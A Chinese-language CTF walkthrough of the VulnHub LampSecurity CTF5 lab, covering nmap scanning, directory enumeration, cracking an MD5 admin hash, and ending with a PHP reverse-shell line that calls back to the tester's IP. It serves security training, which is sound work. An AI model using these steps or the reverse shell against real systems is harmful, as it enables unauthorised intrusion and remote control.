# LampSecurityCTF5 渗透测试实现

-   靶机地址：https://www.vulnhub.com/entry/lampsecurity-ctf5,84/
-   下载地址：https://download.vulnhub.com/lampsecurity/ctf5.zip

## 信息收集

### 主机发现

```shell
└─$ sudo nmap -sn 192.168.2.1/24                                                                                                                                         
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:20 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00017s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.134
Host is up (0.00059s latency).
MAC Address: 00:0C:29:FE:01:38 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:F9:21:09 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```shell
# TCP扫描
└─$ nmap -sT --min-rate 10000 -p- 192.168.2.134 -oA Scan/sT
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:28 HKT
Nmap scan report for 192.168.2.134
Host is up (0.0022s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
901/tcp   open  samba-swat
3306/tcp  open  mysql
51811/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.22 seconds

# UDP扫描
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.134 -oA Scan/sU
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:32 HKT
Warning: 192.168.2.134 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.134
Host is up (0.0011s latency).
Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
111/udp   open  rpcbind
5353/udp  open  zeroconf
32768/udp open  omad
MAC Address: 00:0C:29:FE:01:38 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.81 seconds

```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 服务发现及操作系统扫描

```shell
# 扫描TCP端口服务
└─$ sudo nmap -sC -sV -O -p22,25,80,110,111,139,143,445,901,3306,51811 192.168.2.134 -oA Scan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:35 HKT
Nmap scan report for 192.168.2.134
Host is up (0.00033s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05c3aa152b57c7f42bd3411c7476cd3d (DSA)
|_  2048 43fa3c08abe78b39c3d6f3a45419fea6 (RSA)
25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello [192.168.2.128], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
|_http-server-header: Apache/2.2.6 (Fedora)
|_http-title: Phake Organization
110/tcp   open  pop3        ipop3d 2006k.101
|_ssl-date: 2023-05-22T02:38:53+00:00; -3h58m25s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_pop3-capabilities: STLS TOP UIDL LOGIN-DELAY(180) USER
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          51811/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
|_ssl-date: 2023-05-22T02:38:53+00:00; -3h58m25s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_imap-capabilities: LITERAL+ completed OK SCAN SASL-IR UNSELECT IMAP4REV1 WITHIN CHILDREN ESEARCH THREAD=ORDEREDSUBJECT MULTIAPPEND UIDPLUS THREAD=REFERENCES NAMESPACE LOGIN-REFERRALS IDLE MAILBOX-REFERRALS SORT CAPABILITY STARTTLSA0001 BINARY
445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
3306/tcp  open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 9
|   Capabilities flags: 41516
|   Some Capabilities: Speaks41ProtocolNew, SupportsTransactions, Support41Auth, LongColumnFlag, SupportsCompression, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: Od-M!Xz{}#2oZUz'QEC`
51811/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:FE:01:38 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Hosts: localhost.localdomain, 192.168.2.134; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2023-05-21T22:37:39-04:00
|_clock-skew: mean: -2h58m24s, deviation: 2h00m00s, median: -3h58m25s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.39 seconds

# 扫描UDP服务
└─$ sudo nmap -sC -sV -O -p 111,5353,32768 --min-rate 10000 192.168.2.134 -oA Scan/sC2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:42 HKT
Nmap scan report for 192.168.2.134
Host is up (0.00085s latency).

PORT      STATE  SERVICE     VERSION
111/tcp   open   rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          51811/tcp   status
5353/tcp  closed mdns
32768/tcp closed filenet-tms
MAC Address: 00:0C:29:FE:01:38 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

```

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 常规漏洞脚本扫描

```shell
# TCP端口
└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306,51811 192.168.2.134 -oA Scan/script
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:44 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.134
Host is up (0.00041s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp    open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8
|   /squirrelmail/images/sm_logo.png: SquirrelMail
|   /icons/: Potentially interesting folder w/ directory listing
|_  /inc/: Potentially interesting folder
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.2.134:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=about%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=about%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=about%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.2.134:80/?page=about%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
|_    http://192.168.2.134:80/events/?q=event%2Fical%27%20OR%20sqlspider
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.134
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.2.134:80/events/
|     Form id: user-login-form
|     Form action: /events/?q=node&destination=node
|     
|     Path: http://192.168.2.134:80/?page=contact
|     Form id: 
|     Form action: ?page=contact
|     
|     Path: http://192.168.2.134:80/~andy/data/nanoadmin.php
|     Form id: 
|     Form action: ?
|     
|     Path: http://192.168.2.134:80/events/?q=blog/1
|     Form id: user-login-form
|     Form action: /events/?q=blog/1&destination=blog%2F1
|     
|     Path: http://192.168.2.134:80/events/?q=tracker
|     Form id: user-login-form
|     Form action: /events/?q=tracker&destination=tracker
|     
|     Path: http://192.168.2.134:80/events/?q=node/2
|     Form id: user-login-form
|     Form action: /events/?q=node/2&destination=node%2F2
|     
|     Path: http://192.168.2.134:80/events/?q=event
|     Form id: event-taxonomy-filter-form
|     Form action: /events/?q=event
|     
|     Path: http://192.168.2.134:80/events/?q=event
|     Form id: event-type-filter-form
|     Form action: /events/?q=event
|     
|     Path: http://192.168.2.134:80/events/?q=event
|     Form id: user-login-form
|     Form action: /events/?q=event&destination=event
|     
|     Path: http://192.168.2.134:80/events/?q=event/2009/04/29
|     Form id: event-taxonomy-filter-form
|     Form action: /events/?q=event/2009/04/29
|     
|     Path: http://192.168.2.134:80/events/?q=event/2009/04/29
|     Form id: event-type-filter-form
|     Form action: /events/?q=event/2009/04/29
|     
|     Path: http://192.168.2.134:80/events/?q=event/2009/04/29
|     Form id: user-login-form
|     Form action: /events/?q=event/2009/04/29&destination=event%2F2009%2F04%2F29
|     
|     Path: http://192.168.2.134:80/events/?q=comment/reply/3
|     Form id: comment-form
|     Form action: /events/?q=comment/reply/3
|     
|     Path: http://192.168.2.134:80/events/?q=comment/reply/3
|     Form id: user-login-form
|_    Form action: /events/?q=comment/reply/3&destination=comment%2Freply%2F3
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
901/tcp   open  samba-swat
3306/tcp  open  mysql
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
51811/tcp open  unknown
MAC Address: 00:0C:29:FE:01:38 (VMware)

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 169.76 seconds

# UDP端口
└─$ sudo nmap --script=vuln -p 111,5353,32768 --min-rate 10000 192.168.2.134 -oA Scan/script2
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 15:13 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.134
Host is up (0.00042s latency).

PORT      STATE  SERVICE
111/tcp   open   rpcbind
5353/tcp  closed mdns
32768/tcp closed filenet-tms
MAC Address: 00:0C:29:FE:01:38 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 34.51 seconds

```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

## web发现

-   调用`gobuster`进行初次扫描

-   ```
    └─$ sudo gobuster dir -u http://192.168.2.134 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt       
    [sudo] password for kali: 
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.2.134
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/05/22 20:10:44 Starting gobuster in directory enumeration mode
    ===============================================================
    /events               (Status: 301) [Size: 314] [--> http://192.168.2.134/events/]
    /mail                 (Status: 301) [Size: 312] [--> http://192.168.2.134/mail/]
    /list                 (Status: 301) [Size: 312] [--> http://192.168.2.134/list/]
    /inc                  (Status: 301) [Size: 311] [--> http://192.168.2.134/inc/]
    /phpmyadmin           (Status: 301) [Size: 318] [--> http://192.168.2.134/phpmyadmin/]
    /squirrelmail         (Status: 301) [Size: 320] [--> http://192.168.2.134/squirrelmail/]
    Progress: 219306 / 220561 (99.43%)
    ===============================================================
    2023/05/22 20:12:10 Finished
    ===============================================================
    
    ```

-   参数讲解：

    1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
    2.   `-u`  指定需要扫描的目标
    3.   `-w`  指定需要使用的字典文件进行目录扫描

-   调用`dirb`进行二次扫描

-   ```shell
    └─$ dirb http://192.168.2.134
    
    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------
    
    START_TIME: Mon May 22 20:11:22 2023
    URL_BASE: http://192.168.2.134/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    
    -----------------
    
    GENERATED WORDS: 4612                                                          
    
    ---- Scanning URL: http://192.168.2.134/ ----
    + http://192.168.2.134/~operator (CODE:403|SIZE:289)                                                
    + http://192.168.2.134/~root (CODE:403|SIZE:285)                                                    
    + http://192.168.2.134/cgi-bin/ (CODE:403|SIZE:288)                                                 
    ==> DIRECTORY: http://192.168.2.134/events/                                                         
    ==> DIRECTORY: http://192.168.2.134/inc/                                                            
    + http://192.168.2.134/index.php (CODE:200|SIZE:1538)                                               
    + http://192.168.2.134/info.php (CODE:200|SIZE:50535)                                               
    ==> DIRECTORY: http://192.168.2.134/list/                                                           
    ==> DIRECTORY: http://192.168.2.134/mail/                                                           
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/                                                     
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/                                                   
                                                                                                        
    ---- Entering directory: http://192.168.2.134/events/ ----
    + http://192.168.2.134/events/.profile (CODE:403|SIZE:295)                                          
    + http://192.168.2.134/events/0 (CODE:200|SIZE:10498)                                               
    + http://192.168.2.134/events/admin (CODE:403|SIZE:7959)                                            
    + http://192.168.2.134/events/blog (CODE:200|SIZE:8946)                                             
    + http://192.168.2.134/events/contact (CODE:200|SIZE:8097)                                          
    + http://192.168.2.134/events/event (CODE:200|SIZE:13466)                                           
    ==> DIRECTORY: http://192.168.2.134/events/files/                                                   
    + http://192.168.2.134/events/frontpage (CODE:200|SIZE:10209)                                       
    ==> DIRECTORY: http://192.168.2.134/events/includes/                                                
    + http://192.168.2.134/events/index.php (CODE:200|SIZE:10498)                                       
    + http://192.168.2.134/events/install.mysql (CODE:403|SIZE:300)                                     
    + http://192.168.2.134/events/install.pgsql (CODE:403|SIZE:300)                                     
    + http://192.168.2.134/events/logout (CODE:403|SIZE:7873)                                           
    ==> DIRECTORY: http://192.168.2.134/events/misc/                                                    
    ==> DIRECTORY: http://192.168.2.134/events/modules/                                                 
    + http://192.168.2.134/events/node (CODE:200|SIZE:10498)                                            
    ==> DIRECTORY: http://192.168.2.134/events/profiles/                                                
    + http://192.168.2.134/events/robots.txt (CODE:200|SIZE:1632)                                       
    + http://192.168.2.134/events/Root (CODE:403|SIZE:291)                                              
    ==> DIRECTORY: http://192.168.2.134/events/scripts/                                                 
    + http://192.168.2.134/events/search (CODE:403|SIZE:7873)                                           
    ==> DIRECTORY: http://192.168.2.134/events/sites/                                                   
    ==> DIRECTORY: http://192.168.2.134/events/themes/                                                  
    + http://192.168.2.134/events/tracker (CODE:200|SIZE:9752)                                          
    + http://192.168.2.134/events/user (CODE:200|SIZE:7927)                                             
    + http://192.168.2.134/events/xmlrpc.php (CODE:200|SIZE:42)                                         
                                                                                                        
    ---- Entering directory: http://192.168.2.134/inc/ ----
    + http://192.168.2.134/inc/index.php (CODE:200|SIZE:426)                                            
                                                                                                        
    ---- Entering directory: http://192.168.2.134/list/ ----
    + http://192.168.2.134/list/index.php (CODE:200|SIZE:791)                                           
                                                                                                        
    ---- Entering directory: http://192.168.2.134/mail/ ----
    ==> DIRECTORY: http://192.168.2.134/mail/class/                                                     
    ==> DIRECTORY: http://192.168.2.134/mail/config/                                                    
    ==> DIRECTORY: http://192.168.2.134/mail/functions/                                                 
    ==> DIRECTORY: http://192.168.2.134/mail/help/                                                      
    ==> DIRECTORY: http://192.168.2.134/mail/images/                                                    
    ==> DIRECTORY: http://192.168.2.134/mail/include/                                                   
    + http://192.168.2.134/mail/index.php (CODE:302|SIZE:0)                                             
    ==> DIRECTORY: http://192.168.2.134/mail/locale/                                                    
    ==> DIRECTORY: http://192.168.2.134/mail/plugins/                                                   
    ==> DIRECTORY: http://192.168.2.134/mail/src/                                                       
    ==> DIRECTORY: http://192.168.2.134/mail/themes/                                                    
                                                                                                        
    ---- Entering directory: http://192.168.2.134/phpmyadmin/ ----
    + http://192.168.2.134/phpmyadmin/ChangeLog (CODE:200|SIZE:22676)                                   
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/contrib/                                             
    + http://192.168.2.134/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                 
    + http://192.168.2.134/phpmyadmin/index.php (CODE:200|SIZE:8457)                                    
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/js/                                                  
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/lang/                                                
    + http://192.168.2.134/phpmyadmin/libraries (CODE:403|SIZE:300)                                     
    + http://192.168.2.134/phpmyadmin/LICENSE (CODE:200|SIZE:18011)                                     
    + http://192.168.2.134/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                     
    + http://192.168.2.134/phpmyadmin/README (CODE:200|SIZE:2624)                                       
    + http://192.168.2.134/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                     
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/scripts/                                             
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/setup/                                               
    ==> DIRECTORY: http://192.168.2.134/phpmyadmin/themes/                                              
    + http://192.168.2.134/phpmyadmin/TODO (CODE:200|SIZE:235)                                          
                                                                                                        
    ---- Entering directory: http://192.168.2.134/squirrelmail/ ----
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/class/                                             
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/config/                                            
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/functions/                                         
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/help/                                              
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/images/                                            
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/include/                                           
    + http://192.168.2.134/squirrelmail/index.php (CODE:302|SIZE:0)                                     
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/locale/                                            
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/plugins/                                           
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/src/                                               
    ==> DIRECTORY: http://192.168.2.134/squirrelmail/themes/                                            
                                                                                                        
    ---- Entering directory: http://192.168.2.134/events/files/ ----
    + http://192.168.2.134/events/files/.profile (CODE:403|SIZE:301)                                    
    + http://192.168.2.134/events/files/install.mysql (CODE:403|SIZE:306)                               
    + http://192.168.2.134/events/files/install.pgsql (CODE:403|SIZE:306)                                
    + http://192.168.2.134/events/files/Root (CODE:403|SIZE:297)                                         
                                                                                                         
    ---- Entering directory: http://192.168.2.134/events/includes/ ----                                  
    + http://192.168.2.134/events/includes/.profile (CODE:403|SIZE:304)                                  
    + http://192.168.2.134/events/includes/install.mysql (CODE:403|SIZE:309)                             
    + http://192.168.2.134/events/includes/install.pgsql (CODE:403|SIZE:309)                             
    + http://192.168.2.134/events/includes/Root (CODE:403|SIZE:300)                                      
                                                                                                         
    ---- Entering directory: http://192.168.2.134/events/misc/ ----                                      
    + http://192.168.2.134/events/misc/.profile (CODE:403|SIZE:300)                                      
    + http://192.168.2.134/events/misc/favicon.ico (CODE:200|SIZE:5430)                                  
    + http://192.168.2.134/events/misc/install.mysql (CODE:403|SIZE:305)                                 
    + http://192.168.2.134/events/misc/install.pgsql (CODE:403|SIZE:305)                                 
                                                                                                         
    (!) FATAL: Too many errors connecting to host                                                        
        (Possible cause: OPERATION TIMEOUT)                                                              
                                                                                                         
    -----------------                                                                                    
    END_TIME: Mon May 22 20:40:42 2023                                                                   
    DOWNLOADED: 44815 - FOUND: 48    
    ```

-   查找当前cms是否有漏洞

-   ![image-20230522211501044](https://raw.githubusercontent.com/r0o983/images/main/image-20230522211501044.png)

-   ![image-20230522211613934](https://raw.githubusercontent.com/r0o983/images/main/image-20230522211613934.png)

-   根据提示找到对应的信息泄漏文件

-   ![image-20230522211644666](https://raw.githubusercontent.com/r0o983/images/main/image-20230522211644666.png)

-   保存当前的hash并进行爆破

-   ```shell
    # 查看密码类型
    └─$ hash-identifier 9d2f75377ac0ab991d40c91fd27e52fd
       #########################################################################
       #     __  __                     __           ______    _____           #
       #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
       #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
       #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
       #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
       #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
       #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
       #                                                             By Zion3R #
       #                                                    www.Blackploit.com #
       #                                                   Root@Blackploit.com #
       #########################################################################
    --------------------------------------------------
    
    Possible Hashs:
    [+] MD5
    [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
    
    # 使用john进行密码爆破 -- 得到密码为：shannon
    └─$ john --format=Raw-MD5 hash 
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst
    shannon          (?)     
    1g 0:00:00:00 DONE 2/3 (2023-05-22 21:12) 100.0g/s 38400p/s 38400c/s 38400C/s lacrosse..larry
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed. 
    
    # 使用hashcat进行密码爆破
    └─$ hashcat -a 0 -m 0 9d2f75377ac0ab991d40c91fd27e52fd /usr/share/wordlists/rockyou.txt
    hashcat (v6.2.6) starting
    
    OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    ==================================================================================================================================================
    * Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz, 2910/5885 MB (1024 MB allocatable), 4MCU
    
    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256
    
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1
    
    Optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Salted
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    * Raw-Hash
    
    ATTENTION! Pure (unoptimized) backend kernels selected.
    Pure kernels can crack longer passwords, but drastically reduce performance.
    If you want to switch to optimized kernels, append -O to your commandline.
    See the above message to find out about the exact limits.
    
    Watchdog: Temperature abort trigger set to 90c
    
    Host memory required for this attack: 1 MB
    
    Dictionary cache built:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344392
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    * Runtime...: 1 sec
    
    9d2f75377ac0ab991d40c91fd27e52fd:shannon                  
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 0 (MD5)
    Hash.Target......: 9d2f75377ac0ab991d40c91fd27e52fd
    Time.Started.....: Mon May 22 21:24:48 2023 (0 secs)
    Time.Estimated...: Mon May 22 21:24:48 2023 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:    40219 H/s (0.19ms) @ Accel:512 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 2048/14344385 (0.01%)
    Rejected.........: 0/2048 (0.00%)
    Restore.Point....: 0/14344385 (0.00%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: 123456 -> lovers1
    Hardware.Mon.#1..: Util: 27%
    
    Started: Mon May 22 21:24:46 2023
    Stopped: Mon May 22 21:24:49 2023
    
    参数解释：
    			-m 0 指定md5进行破解
    			-a 0 使用普通模式
    ```

-   登陆后台查看是否有可写文件权限

-   ![image-20230523095436094](https://raw.githubusercontent.com/r0o983/images/main/image-20230523095436094.png)

-   找到任意可写文件，将反弹shell写入

-   >   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.128/1234 0>&1'");?>

